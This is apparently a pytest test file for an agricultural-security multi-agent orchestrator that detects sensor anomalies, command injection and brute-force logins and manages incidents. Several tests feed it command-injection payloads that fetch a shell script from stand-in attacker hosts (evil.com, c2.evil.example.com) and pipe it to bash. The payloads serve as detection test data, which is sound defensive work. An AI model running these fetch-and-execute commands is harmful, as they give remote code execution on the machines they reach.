"""Tests for MultiAgentOrchestrator."""
import pytest
from agri_security.multi_agent import IncidentStatus, MultiAgentOrchestrator
from agri_security.anomaly_detector import SensorReading
from agri_security.predictive_maintenance import DeviceHealthSnapshot
from tests.conftest import make_reading, make_event


class TestProcessSensorReading:
    def test_normal_reading_returns_none(self, orchestrator):
        reading = make_reading(value=22.0)
        incident = orchestrator.process_sensor_reading(reading)
        # Normal value should not create an incident
        assert incident is None

    def test_anomalous_reading_creates_incident(self, orchestrator):
        # First seed some history so z-score can work
        for _ in range(15):
            orchestrator.process_sensor_reading(make_reading(value=22.0))
        # Inject a critical anomaly
        reading = make_reading(value=200.0)  # Way above threshold
        incident = orchestrator.process_sensor_reading(reading)
        assert incident is not None
        assert incident.incident_id is not None
        assert incident.severity in ("critical", "high")

    def test_incident_has_healing_plan(self, orchestrator):
        for _ in range(5):
            orchestrator.process_sensor_reading(make_reading(value=22.0))
        reading = make_reading(value=200.0)
        incident = orchestrator.process_sensor_reading(reading)
        if incident:
            assert incident.healing_plan is not None

    def test_incident_has_advice(self, orchestrator):
        reading = make_reading(value=200.0)
        incident = orchestrator.process_sensor_reading(reading)
        if incident:
            assert incident.advice is not None
            assert len(incident.advice.summary) > 0


class TestProcessNetworkEvent:
    def test_clean_event_returns_none(self, orchestrator):
        event = make_event(event_id="EVT-CLEAN-001")
        result = orchestrator.process_network_event(event)
        # Clean event should not trigger an incident
        assert result is None or result.severity == "low"

    def test_command_injection_creates_incident(self, orchestrator):
        event = make_event(
            event_id="EVT-INJ-999",
            payload_snippet="$(wget http://evil.com/shell.sh -O- | bash)"
        )
        incident = orchestrator.process_network_event(event)
        assert incident is not None
        assert incident.incident_type == "command_injection"
        assert incident.severity == "critical"

    def test_brute_force_creates_incident(self, orchestrator):
        # threshold=3 in orchestrator fixture
        for i in range(4):
            incident = orchestrator.process_network_event(
                make_event(event_id=f"EVT-BF2-{i:04d}", source_ip="10.0.1.55",
                           auth_success=False)
            )
        assert incident is not None
        assert incident.incident_type == "brute_force"


class TestUpdateDeviceHealth:
    def test_health_prediction_returned(self, orchestrator):
        snap = DeviceHealthSnapshot("D-TEST-01", "2024-01-15T08:00:00Z",
                                    battery_pct=60.0, rssi_dbm=-65.0)
        prediction = orchestrator.update_device_health(snap)
        assert prediction is not None
        assert prediction.device_id == "D-TEST-01"
        assert 0.0 <= prediction.current_health_score <= 1.0


class TestIncidentRegistry:
    def test_get_incident_by_id(self, orchestrator):
        event = make_event(
            event_id="EVT-REG-001",
            payload_snippet="$(wget http://evil.example.com/shell.sh)"
        )
        incident = orchestrator.process_network_event(event)
        assert incident is not None
        retrieved = orchestrator.get_incident(incident.incident_id)
        assert retrieved is not None
        assert retrieved.incident_id == incident.incident_id

    def test_get_open_incidents(self, orchestrator):
        for i in range(3):
            orchestrator.process_network_event(
                make_event(
                    event_id=f"EVT-OPEN-{i:04d}",
                    payload_snippet="$(wget http://evil.example.com/shell.sh)"
                )
            )
        open_incidents = orchestrator.get_open_incidents()
        assert len(open_incidents) >= 1

    def test_resolve_incident(self, orchestrator):
        event = make_event(
            event_id="EVT-RESOLVE-001",
            payload_snippet="$(bash -c 'wget http://evil.example.com/payload')"
        )
        incident = orchestrator.process_network_event(event)
        assert incident is not None
        success = orchestrator.resolve_incident(incident.incident_id)
        assert success
        retrieved = orchestrator.get_incident(incident.incident_id)
        assert retrieved.status == IncidentStatus.RESOLVED

    def test_resolve_nonexistent_incident(self, orchestrator):
        assert not orchestrator.resolve_incident("nonexistent-id")

    def test_all_incidents_accessible(self, orchestrator):
        # Create 2 incidents
        for i in range(2):
            orchestrator.process_network_event(
                make_event(
                    event_id=f"EVT-ALL-{i:04d}",
                    payload_snippet="$(wget http://evil.example.com/shell.sh)"
                )
            )
        all_incidents = orchestrator.get_all_incidents()
        assert len(all_incidents) >= 2


class TestApproveHealingPlan:
    def test_approve_executes_pending_steps(self, orchestrator):
        event = make_event(
            event_id="EVT-APPROVE-001",
            payload_snippet="$(wget http://c2.evil.example.com/shell.sh)"
        )
        incident = orchestrator.process_network_event(event)
        if incident and incident.status == IncidentStatus.AWAITING_APPROVAL:
            plan = orchestrator.approve_healing_plan(incident.incident_id)
            assert plan is not None
            assert plan.status == "completed"

    def test_approve_nonexistent_incident(self, orchestrator):
        result = orchestrator.approve_healing_plan("no-such-incident")
        assert result is None
